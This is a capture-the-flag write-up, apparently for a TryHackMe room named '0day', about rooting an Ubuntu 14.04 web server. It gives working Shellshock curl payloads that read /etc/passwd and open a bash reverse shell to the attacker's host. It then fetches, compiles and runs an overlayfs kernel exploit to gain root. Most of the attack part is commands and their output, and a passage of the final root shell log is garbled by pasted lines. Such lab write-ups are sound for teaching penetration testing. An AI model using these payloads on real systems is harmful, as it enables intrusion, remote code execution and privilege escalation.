Difficult: Medium
---------------------------------------
Note: -Exploit Ubuntu, like a Turtle in a Hurricane
	  -Root my secure Website, take a step into the history of hacking
---------------------------------------

Reconnaissance:
+ Scan <IP> available ports and enumurate the directories:
```bash
	nmap -sV -vv -A -T4 -p- <IP>
	PORT   STATE SERVICE REASON         VERSION
	22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
	| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
	|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
	|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
	|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
	80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
	|_http-title: 0day
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	|_http-server-header: Apache/2.4.7 (Ubuntu)
```

```bash
	gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -xtxt -t64
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:                     http://<IP>/
	[+] Method:                  GET
	[+] Threads:                 64
	[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6
	[+] Extensions:              txt
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	/.hta                 (Status: 403) [Size: 284]
	/.hta.txt             (Status: 403) [Size: 288]
	/.htaccess            (Status: 403) [Size: 289]
	/.htaccess.txt        (Status: 403) [Size: 293]
	/.htpasswd            (Status: 403) [Size: 289]
	/.htpasswd.txt        (Status: 403) [Size: 293]
	/admin                (Status: 301) [Size: 313] [--> http://<IP>/admin/]
	/backup               (Status: 301) [Size: 314] [--> http://<IP>/backup/]
	/cgi-bin              (Status: 301) [Size: 315] [--> http://<IP>/cgi-bin/]
	/cgi-bin/             (Status: 403) [Size: 288]
	/css                  (Status: 301) [Size: 311] [--> http://<IP>/css/]
	/img                  (Status: 301) [Size: 311] [--> http://<IP>/img/]
	/index.html           (Status: 200) [Size: 3025]
	/js                   (Status: 301) [Size: 310] [--> http://<IP>/js/]
	/robots.txt           (Status: 200) [Size: 38]
	/robots.txt           (Status: 200) [Size: 38]
	/secret               (Status: 301) [Size: 314] [--> http://<IP>/secret/]
	/server-status        (Status: 403) [Size: 293]
	/uploads              (Status: 301) [Size: 315] [--> http://<IP>/uploads/]
	Progress: 9228 / 9230 (99.98%)
	===============================================================
	Finished
	===============================================================

```
+ Afer check all around the available directories we just know /backup with key ssh but still stuck.
+ The first time we see /cgi-bin, we are not interested about it but research and know maybe that have the vulnerable in this directory /cgi-bin. 
+ Research and know that we can use tool call "nikto" to scan this vulnerable.
+ Let's try it:

```bash
./nikto.pl -h <IP>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <IP>
+ Target Hostname:    <IP>
+ Target Port:        80
+ Start Time:         2024-09-27 04:48:43 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Header>
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a diffe>
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.>
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?n>
+ /admin/: This might be interesting.
+ /backup/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /secret/: This might be interesting.
+ /cgi-bin/test.cgi: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/index.html: Admin login page/section found.
+ 8881 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2024-09-26 22:21:09 (GMT7) (-23254 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
=> Great! We found it the vulnerable /cgi-bin/test.cgi. That is the vulnerable name as "CVE-2014-6271"
+ Let try to exploit it
+ Link: "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi"
+ Link: "https://github.com/opsxcq/exploit-CVE-2014-6271"
+ First we can try command to read file /etc/passwd:
```bash
	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \http://<IP>/cgi-bin/test.cgi
	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	libuuid:x:100:101::/var/lib/libuuid:
	syslog:x:101:104::/home/syslog:/bin/false
	messagebus:x:102:105::/var/run/dbus:/bin/false
	ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
	sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
```
-> It works so now we can put reverse shell through /cgi-bin/test.cgi to RCE.
```bash
	curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.101.46/1234 0>&1' http://<IP>/cgi-bin/test.cgi
```
+ Open the listener open 
```bash
	zicco@z-a:~/Documents/CTFs/0day$ nc -lvnp 1234
	Listening on 0.0.0.0 1234
	Connection received on 10.10.201.210 49682
	bash: cannot set terminal process group (868): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@ubuntu:/usr/lib/cgi-bin$ id
	id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	www-data@ubuntu:/usr/lib/cgi-bin$ cd /
	cd /
	www-data@ubuntu:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
	python3 -c 'import pty;pty.spawn("/bin/bash")'
	www-data@ubuntu:/$ ^Z
	[1]+  Stopped                 nc -lvnp 1234
	zicco@z-a:~/Documents/CTFs/0day$ stty raw -echo;fg
	nc -lvnp 1234
	             id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
+ We use tool "linpeas.sh" scan and find the vector PE. That is kernel "linux 3.13.0-32-generic"
+ Research and find the file compile to PE.
+ Link: "https://www.exploit-db.com/exploits/37292"
```bash
	www-data@ubuntu:/$ cd /
	www-data@ubuntu:/$ ls
	bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
	boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
	www-data@ubuntu:/$ cd /tmp
	www-data@ubuntu:/tmp$ ls
	linpeas.sh
	www-data@ubuntu:/tmp$ wget http://10.11.101.46:8000/ofs.c
	--2024-09-27 00:04:47--  http://10.11.101.46:8000/ofs.c
	Connecting to 10.11.101.46:8000... connected.
	HTTP request sent, awaiting response... 200 OK
	Length: 5119 (5.0K) [text/x-csrc]
	Saving to: 'ofs.c'

	100%[======================================>] 5,119       --.-K/s   in 0.003s  

	2024-09-27 00:04:47 (1.68 MB/s) - 'ofs.c' saved [5119/5119]

	www-data@ubuntu:/tmp$ ls
	linpeas.sh  ofs.c
	www-data@ubuntu:/tmp$ gcc ofs.c -o ofs   
	gcc: error trying to exec 'cc1': execvp: No such file or directory
	www-data@ubuntu:/tmp$ gcc --version
	gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4
	Copyright (C) 2013 Free Software Foundation, Inc.
	This is free software; see the source for copying conditions.  There is NO
	warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

	www-data@ubuntu:/tmp$ which gcc
	/usr/bin/gcc
	www-data@ubuntu:/tmp$ /usr/bin/gcc --version
	gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4
	Copyright (C) 2013 Free Software Foundation, Inc.
	This is free software; see the source for copying conditions.  There is NO
	warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

# Research the error "gcc: error trying to exec 'cc1': execvp: No such file or directory" 
# Reason: This error typically occurs when the compiler (in this case, gcc) is unable to find the executable for the cc1 compiler, which is a part of the GCC toolchain.
# Solution: - Check your PATH environment variable: The PATH environment variable might be misconfigured, preventing the system from finding the cc1 executable. 
#		    - Try running echo $PATH to see the current value of the PATH variable. You can also try setting the PATH variable manually. 
#           - We can try export with the actual path to the GCC installation on your system.
			
	www-data@ubuntu:/tmp$ echo $PATH
	/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
	www-data@ubuntu:/tmp$ export PATH=$PATH:/usr/bin/gcc
	www-data@ubuntu:/tmp$ echo $PATH
	/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.:/usr/bin/gcc
	www-data@ubuntu:/tmp$ gcc ofs.c -o ofs   
	www-data@ubuntu:/tmp$ ls
	linpeas.sh  ofs  ofs.c
	www-data@ubuntu:/tmp$ ./ofs 
	spawning threads
	mount #1
	mount #2
	child threads done
	/etc/ld.so.preload created
	creating shared library
	# id
	uid=0(root) gid=0(root) groups=0(root),33(www-data)
	# cd /root/root.txt	
	sh: 2: cd: can't cd to /root/root.txt
	# cd /root
	# lswww-data@ubuntu:/tmp$ export PATH=$PATH:/usr/bin/gcc
www-data@ubuntu:/tmp$ echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.:/usr/bin/gcc
	root.txt
	# cat root.txt	
	THM{g00d_j0b_0day_is_Pleased}
```







